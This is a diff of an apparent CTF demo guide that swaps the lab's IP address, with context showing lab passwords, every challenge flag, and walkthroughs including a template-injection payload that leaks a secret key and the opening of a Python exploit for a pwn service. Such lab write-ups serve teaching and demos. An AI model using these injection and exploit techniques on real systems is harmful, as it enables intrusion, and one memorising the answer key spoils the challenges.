@@ -10,18 +10,18 @@ Nobody needs to log in: everyone who opens the demo plays as `demo1` on the **De
 
 The 3-wrong-flags limit is shared too. To unlock a challenge, delete one of the Demo Team's wrong submissions for it in **Admin Panel > Submissions**, then wait a minute. To clear everything between showings, use **Admin Panel > Config > Reset** and reset submissions only.
 
-The 2nd demo's CTFd is at `http://192.168.8.109:8500`.
+The 2nd demo's CTFd is at `http://192.168.68.104:8500`.
 
-The commands use `192.168.8.109`. If your IP has changed, use the new one.
+The commands use `192.168.68.104`. If your IP has changed, use the new one.
 
 | Challenge | Category | Where | Flag |
 |---|---|---|---|
-| Calvera | Ursa Minor (Linux) | `ssh calvera@192.168.8.109 -p 2250`, password `neutronstar` | `STARS{c4lv3r4_tru5ts_n0_p4th}` |
-| Flame Nebula | Orion (Web) | `http://192.168.8.109:8501` | `STARS{fl4m3_t3mpl4t3s_sp1ll_s3cr3ts}` |
+| Calvera | Ursa Minor (Linux) | `ssh calvera@192.168.68.104 -p 2250`, password `neutronstar` | `STARS{c4lv3r4_tru5ts_n0_p4th}` |
+| Flame Nebula | Orion (Web) | `http://192.168.68.104:8501` | `STARS{fl4m3_t3mpl4t3s_sp1ll_s3cr3ts}` |
 | Jellyfish | Gemini (Crypto) | downloads: `signals.txt`, `newsletter.txt` | `STARS{tw1n_k3ys_c4nc3l_0ut}` |
 | Lyrids | Lyra (Forensics) | download: `call.wav` | `STARS{lyr1ds_d14l_t0n3s}` |
-| Fafnir | Draco (Reversing) | `ssh fafnir@192.168.8.109 -p 2252`, password `draco` | `STARS{f4fn1r_4nsw3rs_t0_h1s_tru3_n4m3}` |
-| Jabbah | Scorpius (Pwn) | `nc 192.168.8.109 9051`, download `jabbah.c` | `STARS{j4bb4h_r3turns_t0_th3_c0r3}` |
+| Fafnir | Draco (Reversing) | `ssh fafnir@192.168.68.104 -p 2252`, password `draco` | `STARS{f4fn1r_4nsw3rs_t0_h1s_tru3_n4m3}` |
+| Jabbah | Scorpius (Pwn) | `nc 192.168.68.104 9051`, download `jabbah.c` | `STARS{j4bb4h_r3turns_t0_th3_c0r3}` |
 
 Every walkthrough below was played as a visitor on 2026-11-24, over real SSH sessions, and the outputs are the ones it got.
 
@@ -31,7 +31,7 @@ Every walkthrough below was played as a visitor on 2026-11-24, over real SSH ses
 
 Some commands on this account are fakes. `~/.local/bin` comes first in the account's `PATH`, and it holds look-alike `cat`, `grep`, `head`, `tail`, `less` and others. They run the real program, then replace anything shaped like a flag with `[hidden]`.
 
-1. Log in: `ssh calvera@192.168.8.109 -p 2250`, password `neutronstar`.
+1. Log in: `ssh calvera@192.168.68.104 -p 2250`, password `neutronstar`.
 2. `ls -a` shows `.bash_profile  .bashrc  .local  report.txt`.
 3. `cat report.txt` shows the report, with `Catalogue entry: [hidden]`. `grep`, `head` and `less` do the same.
 4. `type cat` prints `cat is hashed (/home/calvera/.local/bin/cat)` (or `cat is /home/calvera/.local/bin/cat` if you haven't run `cat` yet), not `/usr/bin/cat`. That's the fake.
@@ -46,7 +46,7 @@ Worth showing: `/usr/bin/cat report.txt | grep Catalogue` still hides it, becaus
 
 The register writes the typed star name into the source of the card's template, so anything between `{{` and `}}` runs as a template expression.
 
-1. Open `http://192.168.8.109:8501` and name a star `Vega`. The card says "Welcome to the register, **Vega**!"
+1. Open `http://192.168.68.104:8501` and name a star `Vega`. The card says "Welcome to the register, **Vega**!"
 2. Name one `{{7*7}}`. The card says **49**, not `{{7*7}}`. The site is working out what you type.
 3. Name one `{{config}}`. The card shows the site's settings: `{'SITE_NAME': 'Flame Nebula Star Register', 'REGISTER_OPEN': True, 'STARS_PER_VISITOR': 1, 'SECRET_KEY': 'STARS{fl4m3_t3mpl4t3s_sp1ll_s3cr3ts}'}`.
 
@@ -85,7 +85,7 @@ Without a decoder: open the file in a spectrogram viewer (Audacity, or a website
 
 The program compares the name it was started under with its true name, which is stored as plain text inside it. The flag is XORed with the true name, so jumping past the check in gdb only prints garbage.
 
-1. Log in: `ssh fafnir@192.168.8.109 -p 2252`, password `draco`.
+1. Log in: `ssh fafnir@192.168.68.104 -p 2252`, password `draco`.
 2. `./fafnir` prints `You called me "fafnir". That is only the name on my door.` and `Fafnir answers to his true name, and to nothing else.`
 3. `ltrace ./fafnir` shows the comparison: `strcmp("fafnir", "gnitaheath-wyrm") = -1`. The first one is the name it was started as, so the second is its true name. (`strings fafnir` lists `gnitaheath-wyrm` too, among the program's other text.)
 4. Start it under that name with a link: `ln -sf ~/fafnir /tmp/gnitaheath-wyrm`, then `/tmp/gnitaheath-wyrm`. It prints `You know my true name. STARS{f4fn1r_4nsw3rs_t0_h1s_tru3_n4m3}`.
@@ -105,7 +105,7 @@ The address is `0x4017c5` as built. **Read it live** from the program's `superno
 - **From your own computer with Python** (reads the address itself, so it survives a rebuild):
   ```python
   import socket, re, struct
-  s = socket.create_connection(("192.168.8.109", 9051))
+  s = socket.create_connection(("192.168.68.104", 9051))
   banner = b""
   while b"reading:" not in banner:
       banner += s.recv(4096)
